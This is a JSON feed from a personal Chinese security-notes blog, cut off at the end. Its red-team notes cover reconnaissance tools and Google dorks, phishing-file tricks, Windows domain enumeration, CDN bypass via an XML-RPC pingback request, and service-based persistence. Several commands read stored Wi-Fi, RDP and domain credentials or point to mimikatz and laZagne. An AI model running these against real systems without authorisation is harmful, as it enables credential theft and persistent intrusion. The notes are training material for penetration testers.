{
  "version": "https://jsonfeed.org/version/1.1",
  "title": "echo0d'notes",
  "home_page_url": "https://echo0d.github.io/DailyNotes/",
  "feed_url": "https://echo0d.github.io/DailyNotes/feed.json",
  "description": "echo0d'notes-vuepress",
  "items": [
    {
      "title": "防御规避",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/DefenseEvasion/",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/DefenseEvasion/",
      "summary": "防御规避\n一些防御规避方法记录",
      "content_html": "\n<p>一些防御规避方法记录</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "初级红队",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/",
      "summary": "初级红队\n\n没记啥有用的，随缘吧，万一明天就死了呢~",
      "content_html": "\n<blockquote>\n<p>没记啥有用的，随缘吧，万一明天就死了呢~</p>\n</blockquote>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1-信息收集方法",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/1_InformationGathering.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/1_InformationGathering.html",
      "summary": "1-信息收集方法\n\n会持续更新\n\n从广度和深度两个阶段，整理一些信息收集的方法。\n1. 广度信息收集\n1.1 Whois信息\nWhois 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。\n\n站长之家: http://whois.chinaz.com\nBugscaner: http...",
      "content_html": "\n<blockquote>\n<p>会持续更新</p>\n</blockquote>\n<p>从广度和深度两个阶段，整理一些信息收集的方法。</p>\n<h2>1. 广度信息收集</h2>\n<h3>1.1 Whois信息</h3>\n<p><a href=\"https://www.whois.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Whois</a> 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。</p>\n<ul>\n<li>站长之家: http://whois.chinaz.com</li>\n<li>Bugscaner: http://whois.bugscaner.com</li>\n<li>国外在线: https://bgp.he.net</li>\n</ul>\n<h3>1.2 域名历史IP</h3>\n<p>Nslookup   微步在线：https://x.threatbook.cn/</p>\n<h3>1.3 企业信息</h3>\n<ul>\n<li>小蓝本: https://www.xiaolanben.com/pc</li>\n<li>企查查: https://www.qichacha.com</li>\n<li>天眼查: https://www.tianyancha.com</li>\n<li>爱企查: https://aiqicha.baidu.com</li>\n</ul>\n<ul>\n<li>企业信用信息公示系统</li>\n<li>企业邮箱收集</li>\n<li>企业架构画像、人员统计、职责、部门、wifi</li>\n<li>常用部门密码、人员是否泄露过密码</li>\n<li>人员平时爱逛站点</li>\n<li>网络安全设备（waf、ips、ids、router等）</li>\n<li>内部使用的代码托管平台、hug管理平台、OA/erp/crm/sso/mail/vpn等入口</li>\n<li>服务器域名资产统计</li>\n</ul>\n<h3>1.4 子域名</h3>\n<p>泛解析是把 *.example.com 的所有A记录都解析到某个IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。</p>\n<p>网络中有相当多的第三方应用提供了子域的查询功能：</p>\n<ul>\n<li>DNSDumpster：https://dnsdumpster.com/</li>\n<li>Virustotal：https://www.virustotal.com/</li>\n<li>CrtSearch</li>\n<li>threatminer</li>\n<li>Censys</li>\n<li>OneForAll: https://github.com/shmilylty/OneForAll</li>\n<li>layer子域名探测</li>\n<li>https://phpinfo.me/domain/</li>\n<li>https://site.ip138.com/chinacycc.com/domain.htm</li>\n<li>knock.py</li>\n</ul>\n<ul>\n<li>Amass: https://github.com/OWASP/Amass</li>\n<li>Subfinder: https://github.com/projectdiscovery/subfinder</li>\n<li>ksubdomain: https://github.com/knownsec/ksubdomain</li>\n<li>subDomainsBrute: https://github.com/lijiejie/subDomainsBrute</li>\n<li>Sonar: https://omnisint.io/</li>\n<li>查子域: https://chaziyu.com/ (在线)</li>\n</ul>\n<h3>1.4 旁站</h3>\n<ul>\n<li>在线: http://stool.chinaz.com/same</li>\n<li>在线: https://site.ip138.com</li>\n</ul>\n<h3>1.5 真实IP（CDN）</h3>\n<h4>1. CDN验证</h4>\n<p>可通过多地ping的方式确定目标是否使用了CDN，常用的网站有 http://ping.chinaz.com/</p>\n<p>https://asm.ca.com/en/ping.php 等。</p>\n<h4>2. 域名查找</h4>\n<p>使用了CDN的域名的父域或者子域名不一定使用了CDN，可以通过这种方式去查找对应的IP。</p>\n<h4>3. 历史记录查找</h4>\n<p>CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。</p>\n<h4>4. 邮件信息</h4>\n<p>通过社会工程学的方式进行邮件沟通，从邮件头中获取IP地址，IP地址可能是网站的真实IP或者是目标的出口IP。</p>\n<h4>5. 利用工具</h4>\n<ul>\n<li>全球ping: https://www.wepcc.com</li>\n<li>dns检测: https://tools.ipip.net/dns.php</li>\n<li>Xcdn: https://github.com/3xp10it/xcdn</li>\n<li>在线: https://ipchaxun.com</li>\n</ul>\n<h3>1.6 敏感信息</h3>\n<h4>1. 网页源码</h4>\n<p>网页源码可能存在敏感信息泄露</p>\n<h4>2. Googlehack语法</h4>\n<ul>\n<li>后台地址</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>site:xxx.com intitle:管理|后台|登陆|管理员|系统|内部\nsite:xxx.com inurl:login|admin|system|guanli|denglu|manage|admin_login|auth|dev\n</code></pre></div><ul>\n<li>敏感文件</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite OR filetype:log OR filetype:conf)\n</code></pre></div><ul>\n<li>测试环境</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>site:xxx.com inurl:test|ceshi\nsite:xxx.com intitle:测试\n</code></pre></div><ul>\n<li>邮箱</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>site:xxx.com (intitle:\"Outlook Web App\" OR intitle:\"邮件\" OR inurl:\"email\" OR inurl:\"webmail\")\n</code></pre></div><ul>\n<li>其他</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>site:xxx.com inurl:api|uid=|id=|userid=|token|session\nsite:xxx.com intitle:index.of \"server at\"\n</code></pre></div><h4>3. Github</h4>\n<ul>\n<li>@xxx.com password/secret/credentials/token/config/pass/login/ftp/ssh/pwd</li>\n<li>@xxx.com security_credentials/connetionstring/JDBC/ssh2_auth_password/send_keys</li>\n</ul>\n<h4>4. 网盘引擎</h4>\n<ul>\n<li>超能搜: https://www.chaonengsou.com</li>\n</ul>\n<h4>5. 备份文件</h4>\n<p>文件格式www.zip  xx.com.zip  www.xx.com.zip wwwroot.zip .svn/.git/sql/robots/crossdomin.xml/DS_Store等</p>\n<pre><code>*  https://github.com/lijiejie/ds_store_exp\n*  https://github.com/admintony/svnExploit\n</code></pre>\n<h4>6. 历史泄露过的资料</h4>\n<ul>\n<li>Https://havaibeenpwned.com/</li>\n<li>https://github.com/kernelmachine/havaibeenpwned</li>\n</ul>\n<h4>7. Github/Gitee等代码托管平台</h4>\n<ul>\n<li>https://github.com/lijiejie/GitHack</li>\n<li>https://github.com/MiSecurity/x-patrol</li>\n<li>https://github.com/az0ne/Github_Nuggests</li>\n<li>https://github.com/mazen160/GithubCloner</li>\n</ul>\n<h3>1.7 空间引擎搜索</h3>\n<ul>\n<li>FOFA: https://fofa.so</li>\n<li>Quake: https://quake.360.cn/quake/#/index</li>\n<li>Hunter: https://hunter.qianxin.com</li>\n<li>Shadon: https://www.shodan.io</li>\n<li>ZoomEye: https://www.zoomeye.org</li>\n</ul>\n<h3>1.8 SSL证书信息</h3>\n<ul>\n<li>https://crt.sh/?q=%25.target.com</li>\n<li>https://censys.io/certificates?q=target.com</li>\n<li>https://github.com/cheetz/sslScrape</li>\n</ul>\n<h3>1.9 历史漏洞</h3>\n<ul>\n<li>乌云镜像: https://wooyun.x10sec.org</li>\n<li>Seebug: https://www.seebug.org</li>\n<li>Exploit Database: https://www.exploit-db.com</li>\n<li>Vulners: https://vulners.com</li>\n<li>Sploitus: https://sploitus.com</li>\n</ul>\n<h3>1.10 APP</h3>\n<ul>\n<li>小蓝本: https://www.xiaolanben.com/pc</li>\n<li>七麦: https://www.qimai.cn</li>\n<li>AppStore: https://www.apple.com/app-store</li>\n<li>APP反编译 搜索/截取APP的请求信息</li>\n</ul>\n<h3>1.11 小程序公众号</h3>\n<ul>\n<li>微信直接搜索</li>\n<li>小蓝本: https://www.xiaolanben.com/pc</li>\n<li>搜狗: https://weixin.sogou.com</li>\n</ul>\n<h3>1.13 端口+C段</h3>\n<ul>\n<li>Nmap: https://nmap.org</li>\n<li>Fscan: https://github.com/shadow1ng/fscan</li>\n<li>Txportmap: https://github.com/4dogs-cn/TXPortMap</li>\n<li>Masscan: https://github.com/robertdavidgraham/masscan</li>\n</ul>\n<h3>1.14 蜜罐判断</h3>\n<ul>\n<li>https://honeyscore.shodan.io/</li>\n</ul>\n<h3>1.15 默认密码</h3>\n<ul>\n<li>https://defualt-password.info/</li>\n<li>http://routerpasswords.com</li>\n</ul>\n<h3>1.16 需要注册时</h3>\n<p>sms</p>\n<ul>\n<li>\n<p>https://www.materialtools.com/</p>\n</li>\n<li>\n<p>http://receivefreesms.com/</p>\n</li>\n</ul>\n<p>email</p>\n<ul>\n<li>\n<p>https://10minutemail.net/</p>\n</li>\n<li>\n<p>https://zn.mytrashmailer.com/</p>\n</li>\n<li>\n<p>http://24mail.chacuo.net.enus</p>\n</li>\n<li>\n<p>https://www.linshiyouxiang.net/</p>\n</li>\n</ul>\n<p>Fake id</p>\n<ul>\n<li>https://www.fakenamegenerator.com/</li>\n<li>http://www.haoweichi.com/</li>\n<li>https://www.fakeaddressgenerator.com/</li>\n</ul>\n<h2>2. 深度信息收集</h2>\n<h3>2.1 指纹识别</h3>\n<ul>\n<li>网页源代码、浏览器插件findsomething、网站报错信息</li>\n<li>请求头/响应头</li>\n<li>浏览器插件: Wappalyzer whatruns</li>\n<li>云悉: http://www.yunsee.cn</li>\n<li>EHole: https://github.com/EdgeSecurityTeam/EHole</li>\n<li>TideFinger: https://github.com/TideSec/TideFinger</li>\n<li>ObserverWard:https://github.com/0x727/ObserverWard_0x727</li>\n<li>Webfinger: https://github.com/se55i0n/Webfinger</li>\n<li>FingerPrint: https://github.com/tanjiti/FingerPrint</li>\n<li>WTFScan: https://github.com/dyboy2017/WTF_Scan</li>\n<li>WebEye: https://github.com/zerokeeper/WebEye/</li>\n<li>Dayu: https://github.com/Ms0x0/Dayu</li>\n<li></li>\n</ul>\n<h3>2.2 Title识别</h3>\n<ul>\n<li>HTTPX: https://github.com/projectdiscovery/httpx</li>\n<li>WebBatchRequest: https://github.com/ScriptKid-Beta/WebBatchRequest</li>\n<li>Bscan: https://github.com/broken5/bscan</li>\n</ul>\n<h3>2.3 目录扫描</h3>\n<ul>\n<li>Dirsearch: https://github.com/maurosoria/dirsearch</li>\n<li>Dirmap: https://github.com/H4ckForJob/dirmap</li>\n</ul>\n<h3>2.4 JS接口</h3>\n<ul>\n<li>JSFinder: https://github.com/Threezh1/JSFinder</li>\n<li>URLFinder: https://github.com/pingc0y/URLFinder</li>\n<li>LinkFinder: https://github.com/GerbenJavado/LinkFinder</li>\n<li>Packer-Fuzzer: https://github.com/rtcatc/Packer-Fuzzer (webpack)</li>\n<li>搜索关键接口</li>\n</ul>\n<ol>\n<li>config/api</li>\n<li>method:\"get\"</li>\n<li>http.get(\"</li>\n<li>method:\"post\"</li>\n<li>http.post(\"</li>\n<li>$.ajax</li>\n<li>service.httppost</li>\n<li>service.httpget</li>\n</ol>\n<h3>2.5 WAF识别</h3>\n<ul>\n<li>WhatWaf: https://github.com/Ekultek/WhatWaf</li>\n<li>wafw00f: https://github.com/EnableSecurity/wafw00f</li>\n<li>百度搜WAF图</li>\n</ul>\n<h3>2.7 社会工程学</h3>\n<p>基于之前收集到的信息，可以使用Office/CHM/RAR/EXE/快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。</p>\n<ul>\n<li>\n<p>Office可以使用Office漏洞、宏、OLE对象、PPSX等方式构造利用文件。</p>\n</li>\n<li>\n<p>Exe可以使用特殊的Unicode控制字符如RLO (Right-to-Left Override) 等来构建容易混淆的文件名。</p>\n</li>\n<li>\n<p>RAR主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。</p>\n</li>\n</ul>\n<p>如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。</p>\n<p>需要注意的是，<strong>钓鱼测试也需要注意合规问题</strong>，不能冒充监管单位、不能发送违法违规信息。具体可以参考**《中华人民共和国电信条例》<strong>、</strong>《中华人民共和国互联网电子邮件服务管理办法》**等法律法规。</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2-内网信息收集-windows",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/2_Intranet_windows.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/2_Intranet_windows.html",
      "summary": "2-内网信息收集-windows\n常用信息搜集\n\nwhoami   # 查看当前用户\nnet user   # 查看所有用户\nquery user   # 查看当前在线用户\nipconfig /all   # 查看当前主机的主机名/IP/DNS等信息\nroute print   # 查看路由表信息\nnetstat -ano   # 查看端口开放情况\na...",
      "content_html": "\n<h2>常用信息搜集</h2>\n<ul>\n<li>whoami   # 查看当前用户</li>\n<li>net user   # 查看所有用户</li>\n<li>query user   # 查看当前在线用户</li>\n<li>ipconfig /all   # 查看当前主机的主机名/IP/DNS等信息</li>\n<li>route print   # 查看路由表信息</li>\n<li>netstat -ano   # 查看端口开放情况</li>\n<li>arp -a   # 查看arp解析情况</li>\n<li>tasklist /svc   # 查看进程及对应服务名</li>\n<li>net localgroup administrators   # 查看管理员组成员</li>\n<li>systeminfo   # 查看系统信息含补丁信息</li>\n<li>net use   # 查看ipc连接情况</li>\n<li>net view   # 查看匿名共享情况</li>\n<li>netsh firewall show state   # 查看防火墙状态</li>\n<li>cmdkey /l   # 查看当前保存的登陆凭证=</li>\n<li>net view  ip 知道ip查看计算机名</li>\n<li>nbtstat -a ip  知道ip查看计算机名</li>\n<li>ping name  知道计算机名查看ip</li>\n<li>nbtstat -a name 知道计算机名查看ip</li>\n</ul>\n<h2>密码搜集</h2>\n<ul>\n<li>\n<p>netsh wlan show profiles   # 查看连接过的wifi名称</p>\n</li>\n<li>\n<p>netsh wlan show profile name=\"wifi名称\" key=clear   # 查看wifi的密码</p>\n</li>\n<li>\n<p>dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials*   # 查看RDP连接凭证</p>\n</li>\n<li>\n<p>dir /a /s /b \"网站目录\\*config*\" &gt; 1.txt   # 数据库配置文件</p>\n</li>\n<li>\n<p>laZagne.exe all -oN   # 本地wifi/浏览器等密码</p>\n</li>\n<li>\n<p>dir %APPDATA%\\Microsoft\\Windows\\Recent   # 查看最近打开的文档</p>\n</li>\n</ul>\n<h2>连通性</h2>\n<ul>\n<li>\n<p>ping www.baidu.com   # ICMP连通性</p>\n</li>\n<li>\n<p>nslookup www.baidu.com   # DNS连通性</p>\n</li>\n<li>\n<p>curl https://www.baidu.com   # http连通性</p>\n</li>\n<li>\n<p>nc ip port   # TCP连通性</p>\n</li>\n</ul>\n<h1>域信息搜集</h1>\n<h2>常用信息搜集</h2>\n<ul>\n<li>\n<p>net config workstation   #查看当前登录域</p>\n</li>\n<li>\n<p>net user /domain   # 获得所有域用户列表</p>\n</li>\n<li>\n<p>net view /domain   # 查看所有的域</p>\n</li>\n<li>\n<p>net view /domain:XXX   # 查看该域内所有主机</p>\n</li>\n<li>\n<p>net group /domain   # 查看所有域用户组列表</p>\n</li>\n<li>\n<p>net group \"domain computers\" /domain   # 查看域内所有的主机名</p>\n</li>\n<li>\n<p>net group \"domain admins\" /domain   # 查看所有域管理员</p>\n</li>\n<li>\n<p>net group \"domain controllers\" /domain   # 查看所有域控制器</p>\n</li>\n<li>\n<p>net group \"enterprise admins\" /domain   # 查看所有企业管理员</p>\n</li>\n<li>\n<p>nltest /domain_trusts   # 获取域信任信息</p>\n</li>\n<li>\n<p>net time /domain   # 查看当前登录域</p>\n</li>\n<li>\n<p>net accounts /domain   # 查看域密码策略</p>\n</li>\n<li>\n<p>dsquery server   # 寻找目录中的域控制器</p>\n</li>\n<li>\n<p>netdom query pdc   # 查看域控制器主机名</p>\n</li>\n<li>\n<p>wmic useraccount get /all   #获取域内用户的详细信息</p>\n</li>\n</ul>\n<h2>环境信息搜集</h2>\n<ul>\n<li>\n<p>nbtscan.exe xx.xx.xx.xx/24   # 查看c段机器</p>\n</li>\n<li>\n<p>csvde.exe -f 1.csv -k   # 批量导入/导出AD用户</p>\n</li>\n<li>\n<p>setspn.exe -T xx.xx.xx.xx -Q <em>/</em>   # 查看当前域内所有spn</p>\n</li>\n</ul>\n<h2>密码搜集</h2>\n<ul>\n<li>dir /s /a \\域控IP\\SYSVOL*.xml   # 获取域里面所有机子的本地管理员账号密码</li>\n<li>mimikatz抓密码</li>\n</ul>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "3-CDN绕过",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/3_CDN.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/1-InformationGathering/3_CDN.html",
      "summary": "3-CDN绕过\n1、利用历史记录\n\n通过查询 DNS 记录 / IP 历史记录 / 子域名 等数据记录\n\n很多网站只给关键的域名或者主域名做了 CDN，其下很多子域名没有使用 CDN 服务，所以我们可 以通过查询目标网站的根域名、二级域名、三级域名甚至多级子域名来获得真实IP。不过有时候查 出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可...",
      "content_html": "\n<h2>1、利用历史记录</h2>\n<blockquote>\n<p>通过查询 DNS 记录 / IP 历史记录 / 子域名 等数据记录</p>\n</blockquote>\n<p>很多网站只给关键的域名或者主域名做了 CDN，其下很多子域名没有使用 CDN 服务，所以我们可 以通过查询目标网站的根域名、二级域名、三级域名甚至多级子域名来获得真实IP。不过有时候查 出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可以继续扫描同 C 段的 IP 和端口，然后 逐个探测是否为目标网站。 在网站使用 CDN 服务之前，解析的是真实IP，所以可以查询 DNS 历史记录，看是否能探测到使用 CDN 之前的 IP 。 DNS 解析记录中重点关注 TXT 记录和 SPF 记录，是否有泄露真实IP。</p>\n<h3>1.1 在线查询平台</h3>\n<p>https://ipw.cn/dns/  DNS记录参考</p>\n<p>https://www.ip138.com/  IP历史</p>\n<p>https://chaziyu.com/  子域名</p>\n<p>微步Threatbook：https://x.threatbook.cn/</p>\n<p>Viewdns：https://viewdns.info/</p>\n<p>Dnsdb：https://www.dnsdb.io/zh-cn/</p>\n<h3>1.2 网络空间测绘搜索引擎</h3>\n<p>Censys https://censys.io/</p>\n<p>FOFA https://fofa.info</p>\n<p>Shodan https://www.shodan.io/</p>\n<p>Zoomeye https://www.zoomeye.org/</p>\n<p>hunter https://hunter.qianxin.com/</p>\n<p>quake https://quake.360.net/quake/</p>\n<h3>1.3 工具和脚本</h3>\n<p>SubDomainsBrute https://github.com/lijiejie/subDomainsBrute</p>\n<p>ESD https://github.com/FeeiCN/ESD</p>\n<p>Layer 子域名挖掘机 https://github.com/euphrat1ca/LayerDomainFinder</p>\n<p>Xray https://github.com/chaitin/xray （subdomain 子域名发掘功能）</p>\n<p><strong>重点：oneforall  https://github.com/shmilylty/OneForAll</strong></p>\n<h2>2、通过Email</h2>\n<blockquote>\n<p>具体没试过</p>\n</blockquote>\n<p>一般大型网站自己部署架设的邮件服务器如果向外部用户发送邮件的话，如果中间未经任何数据处理和防护措施，那么邮件头部的源码中会包含此邮件服务器的真实 IP 地址。</p>\n<p>小技巧：通过发送邮件给一个不存在的邮箱地址，由于该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件的服务器的真实IP通知。</p>\n<h2>3、通过 SSL 证书</h2>\n<p>证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包 含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。</p>\n<p>CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实IP地址。</p>\n<h2>4、通过海外DNS查询及多点ping</h2>\n<p>针对国内市场用户，部分的 CDN 服务商并没有做海外市场的 CDN ，所以可以通过寻找小众、冷门 的海外 DNS 查询，看是否能获得真实 IP 。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>nslookup target.com &lt;海外 DNS 地址&gt;\n</code></pre></div><p>多点ping推荐站长之家：https://ping.chinaz.com</p>\n<h2>5、通过敏感文件泄露</h2>\n<p>例如：</p>\n<ul>\n<li>服务器日志文件</li>\n<li>探针文件，例如 phpinfo</li>\n<li>网站备份压缩文件 .</li>\n<li>DS_Store</li>\n<li>.hg</li>\n<li>.git</li>\n<li>SVN</li>\n<li>Web.xml</li>\n</ul>\n<p>主要靠字典</p>\n<h2>6、通过变更的域名</h2>\n<blockquote>\n<p>（查询whois信息）</p>\n</blockquote>\n<p>很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP。</p>\n<h2>7、 通过APP移动端应用</h2>\n<p>如果网站存在 APP，可以通过抓包分析其APP的数据流量，看是否能找到网站真实IP地址，记得关注APP的历史版本 。</p>\n<h2>8、通过 F5 LTM 解码</h2>\n<blockquote>\n<p>第一次听说这东西</p>\n</blockquote>\n<p>LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。 当服务器使用F5 LTM做负载均衡时，通过对 set-cookie 关键字的解码，可以获取服务器真实 ip 地址。 例如：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Set-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000\n</code></pre></div><ul>\n<li>先把第一小节的十进制数，即 605532106 取出来</li>\n<li>将其转为十六进制数 2417afca</li>\n<li>接着从后至前，取四个字节出来:CA AF 17 24</li>\n<li>最后依次转为十进制数 202.175.23.36，即是服务器的真实ip地址。</li>\n</ul>\n<h2>9、通过 CDN 标头特征值</h2>\n<blockquote>\n<p>感觉太麻烦了，以后再说</p>\n</blockquote>\n<p>很多网站启用CDN后，配置了拒绝直接访问真实IP ，可以通过匹配特征标头的方法，去缩小范围。</p>\n<h2>10、通过 XML-RPC PINGBACK 通信</h2>\n<blockquote>\n<p>wordpress才好用</p>\n</blockquote>\n<p>在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开 启。 XML-RPC 支持 trackback 和 pingback。</p>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/xmlrpc.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">domain.com</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span></span>\nlike Gecko) Chrome/70.0.3538.110 Safari/537.36\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;\nq=0.8\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">en,zh-CN;q=0.9,zh;q=0.8</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">323</span></span>\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;methodCall&gt;\n&lt;methodName&gt;pingback.ping&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;http://2vbis4.dnslog.cn&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;https://domain.com/&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall\n</code></pre></div><p>刷新一下dnslog，可以获得了真实服务器IP。</p>\n<h2>11、通过 favicon.ico 哈希特征</h2>\n<p>资产测绘平台都支持</p>\n<h2>12、通过网页源码特征值</h2>\n<blockquote>\n<p>资产测绘平台，但是不会</p>\n</blockquote>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1. Linux权限维持",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/1_LinuxPersistence.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/1_LinuxPersistence.html",
      "summary": "1. Linux权限维持\n1. Linux权限维持-PAM后门\n\nPAM (Pluggable Authentication Modules, 嵌入式模块)",
      "content_html": "\n<h2>1. Linux权限维持-PAM后门</h2>\n<blockquote>\n<p>PAM (Pluggable Authentication Modules, 嵌入式模块)</p>\n</blockquote>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2. Windows权限维持",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/2_WindowsPersistence.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/3-Persistence/2_WindowsPersistence.html",
      "summary": "2. Windows权限维持\n权限维持--sc create 服务\n有些程序由于代码格式的原因，无法注册为服务，在某些版本的windows上（win10试过不可以）可以尝试一下\n后台运行 waitfor 命令\nwaitfor 命令是 Windows 系统中的一个命令行工具，用于等待指定的时间或等待特定事件发生。然而，waitfor 命令本身并不支持后台...",
      "content_html": "\n<h3>权限维持--sc create 服务</h3>\n<p>有些程序由于代码格式的原因，无法注册为服务，在某些版本的windows上（win10试过不可以）可以尝试一下</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>sc Create 服务名称 <span class=\"token assign-left variable\">binPath</span><span class=\"token operator\">=</span> <span class=\"token string\">\"cmd /c start 路径\"</span> <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span> own <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span> interact <span class=\"token assign-left variable\">start</span><span class=\"token operator\">=</span> auto\nsc Create 服务名称 <span class=\"token assign-left variable\">binPath</span><span class=\"token operator\">=</span> <span class=\"token string\">\"Rundll32.exe DLL路径 执行函数 参数\"</span> <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span> own <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span> interact <span class=\"token assign-left variable\">start</span><span class=\"token operator\">=</span> auto\n</code></pre></div><h3>后台运行 waitfor 命令</h3>\n<p>waitfor 命令是 Windows 系统中的一个命令行工具，用于等待指定的时间或等待特定事件发生。然而，<code>waitfor</code> 命令本身并不支持后台运行，它会阻塞当前命令行窗口，直到满足指定的条件。\n使用启动器（Wrapper）脚本：\n创建一个批处理脚本（例如 <code>waitfor_background.bat</code>），在其中调用 <code>waitfor</code> 命令，然后使用 <code>start</code> 命令来在后台运行该脚本。示例：</p>\n<div 